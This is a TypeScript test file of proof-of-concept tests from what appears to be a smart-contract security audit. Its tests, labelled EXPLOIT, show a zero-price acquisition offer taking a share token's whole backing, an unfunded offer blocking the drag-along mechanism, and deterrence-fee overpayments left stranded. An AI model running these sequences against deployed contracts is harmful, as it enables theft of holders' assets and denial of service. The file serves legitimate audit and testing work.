import { expect } from "chai";
import { Contract } from "ethers";
import {
  connection,
  ethers,
  owner,
  signer1,
  signer3,
  signer7,
} from "../../TestBase.ts";
import { mintAndWrap } from "../../Fixtures.ts";
import { setBalance } from "../../../scripts/helpers/setBalance.ts";

// Proof-of-concept tests for the DoS & Griefing audit of branch `ai-audit` @ 0064dfb.
//
//   Finding 1 — DragAlong.offerAcquisition/acceptOffer: the offer slot is a single global lock with
//               NO minimum-price check. Anyone who pays the 1 ETH deterrence fee can submit a
//               zero-price offer. If the issuer (and no >10% holder) cancels within the 20-day veto
//               window, acceptOffer() hands the ENTIRE underlying base-token backing to the attacker
//               for free (DragAlong.sol:84,121). If the attacker instead never funds the offer, the
//               slot is bricked: acceptOffer() always reverts and all legitimate offers are blocked
//               with OfferPending until the issuer manually cancels.
//   Finding 2 — DeterrenceFee.deter: only `fee` is forwarded to the owner; any excess msg.value is
//               silently retained in the token contract. None of the token contracts (Shares,
//               SharesUnderAgreement, BridgedSharesUnderAgreement) have an ETH withdrawal path, so
//               the excess is permanently lost to the payer (DeterrenceFee.sol:57-62).

const DETERRENCE_FEE = ethers.parseEther("0.01");
const DRAG_PROPOSAL_DELAY = 20n * 24n * 60n * 60n; // 20 days in seconds
const DRAG_DETERRENCE_FEE = DETERRENCE_FEE * 100n; // deter(100) => 1 ETH

async function deployShares(): Promise<Contract> {
  const Shares = await ethers.getContractFactory(
    "contracts/shares/base/Shares.sol:Shares"
  );
  const shares = await Shares.deploy(
    "TST",
    "Test Company Shares",
    "https://test.com/terms",
    owner
  );
  await shares.waitForDeployment();
  return shares as unknown as Contract;
}

async function deploySha(base: Contract): Promise<Contract> {
  const Sha = await ethers.getContractFactory(
    "contracts/shares/sha/SharesUnderAgreement.sol:SharesUnderAgreement"
  );
  const sha = await Sha.deploy(base, "https://test.com/agreement", 0, owner);
  await sha.waitForDeployment();
  return sha as unknown as Contract;
}

describe("Finding 1 — DragAlong: zero-price / unfunded acquisition offer (grief + seizure)", function () {
  let shares: Contract;
  let sha: Contract;
  let shaAddr: string;
  let sharesAddr: string;
  let attackerAddr: string;

  beforeEach(async function () {
    shares = await deployShares();
    sha = await deploySha(shares);
    shaAddr = await sha.getAddress();
    sharesAddr = await shares.getAddress();
    attackerAddr = await signer7.getAddress();
    await setBalance(attackerAddr, ethers.parseEther("2"));

    // 12 dormant holder addresses with 1 wrapped token each -> totalSupply 12, every holder owns
    // exactly 1 <= 12/10, so NO holder can veto the offer (canCancelOffer needs balance > 10%).
    for (let i = 0; i < 12; i++) {
      const holderAddr = ethers.Wallet.createRandom().address;
      await mintAndWrap(shares, sha, holderAddr, 1n);
    }
    expect(await sha.totalSupply()).to.equal(12n);
  });

  it("EXPLOIT: a zero-price offer seizes the entire base-token backing after the veto window", async function () {
    // No minimum price: any caller with 1 ETH can make an acquisition offer at price 0.
    await sha
      .connect(signer7)
      .offerAcquisition(sharesAddr, 0n, "0x", { value: DRAG_DETERRENCE_FEE });
    const offer = await sha.latestOffer();
    expect(offer.buyer).to.equal(attackerAddr);
    expect(offer.pricePerShareE18).to.equal(0n);

    // While the attacker's offer is pending, no legitimate offer can be submitted at all.
    await setBalance(await signer1.getAddress(), ethers.parseEther("2"));
    await expect(
      sha
        .connect(signer1)
        .offerAcquisition(sharesAddr, ethers.parseEther("100"), "0x", {
          value: DRAG_DETERRENCE_FEE,
        })
    ).to.be.revertedWithCustomError(sha, "OfferPending");

    // The 20-day veto window passes without the issuer or any holder cancelling.
    await connection.networkHelpers.time.increase(DRAG_PROPOSAL_DELAY + 1n);

    // acceptOffer is permissionless: the attacker executes the zero-price acquisition.
    await sha.connect(signer7).acceptOffer();

    // The attacker now holds ALL underlying base tokens, and paid nothing for them.
    expect(await shares.balanceOf(shaAddr)).to.equal(0n);
    expect(await shares.balanceOf(attackerAddr)).to.equal(12n);
    expect(await sha.binding()).to.equal(false);
  });

  it("EXPLOIT: an offer the attacker never funds bricks the drag-along mechanism", async function () {
    // Non-zero price, but the attacker neither holds the currency nor approves it.
    await sha
      .connect(signer7)
      .offerAcquisition(sharesAddr, ethers.parseEther("100"), "0x", {
        value: DRAG_DETERRENCE_FEE,
      });

    await connection.networkHelpers.time.increase(DRAG_PROPOSAL_DELAY + 1n);

    // Execution ALWAYS reverts: transferFrom fails because the buyer never funded/approved.
    await expect(sha.connect(signer1).acceptOffer()).to.be.revert(ethers);

    // The failed execution does NOT consume the offer slot (the delete is rolled back).
    expect((await sha.latestOffer()).buyer).to.equal(attackerAddr);

    // ...so legitimate offers stay blocked until the issuer notices and cancels manually.
    await setBalance(await signer1.getAddress(), ethers.parseEther("2"));
    await expect(
      sha
        .connect(signer1)
        .offerAcquisition(sharesAddr, ethers.parseEther("100"), "0x", {
          value: DRAG_DETERRENCE_FEE,
        })
    ).to.be.revertedWithCustomError(sha, "OfferPending");

    await sha.connect(owner).cancelOffer("unblock");
    expect((await sha.latestOffer()).buyer).to.equal(ethers.ZeroAddress);
  });

  it("control: a funded fair-price offer executes and pays the holders", async function () {
    const buyer = signer3;
    const buyerAddr = await buyer.getAddress();
    await setBalance(buyerAddr, ethers.parseEther("2"));
    await shares.connect(owner).mint(buyer, 1000n);
    await shares.connect(buyer).approve(shaAddr, 1000n);

    await sha
      .connect(buyer)
      .offerAcquisition(sharesAddr, ethers.parseEther("2"), "0x", {
        value: DRAG_DETERRENCE_FEE,
      });
    await connection.networkHelpers.time.increase(DRAG_PROPOSAL_DELAY + 1n);
    await sha.connect(buyer).acceptOffer();

    // Buyer paid 2 * 12 = 24 base and received the 12 base of backing.
    expect(await shares.balanceOf(shaAddr)).to.equal(24n);
    expect(await shares.balanceOf(buyer)).to.equal(1000n - 24n + 12n);
    expect(await sha.binding()).to.equal(false);
  });
});

describe("Finding 2 — DeterrenceFee: excess msg.value is silently retained by the token", function () {
  let shares: Contract;

  beforeEach(async function () {
    shares = await deployShares();
    await shares.connect(owner).mint(signer1, 100n);
    await setBalance(await signer3.getAddress(), ethers.parseEther("1"));
  });

  it("EXPLOIT: paying 2x the deterrence fee strands the excess in the token contract forever", async function () {
    const tokenAddr = await shares.getAddress();
    const ownerAddr = await owner.getAddress();

    const tokenBefore = await signer3.provider!.getBalance(tokenAddr);
    const ownerBefore = await signer3.provider!.getBalance(ownerAddr);

    await shares
      .connect(signer3)
      ["initRecovery(address)"](await signer1.getAddress(), {
        value: ethers.parseEther("0.02"),
      });

    const tokenAfter = await signer3.provider!.getBalance(tokenAddr);
    const ownerAfter = await signer3.provider!.getBalance(ownerAddr);

    // The fee is 0.01 ETH and only that amount is forwarded to the owner...
    expect(ownerAfter - ownerBefore).to.equal(DETERRENCE_FEE);
    // ...the remaining 0.01 ETH the attacker sent is never refunded. It sits in the token
    // contract, which has no ETH withdrawal path, so it is permanently lost to the payer.
    expect(tokenAfter - tokenBefore).to.equal(DETERRENCE_FEE);
  });
});
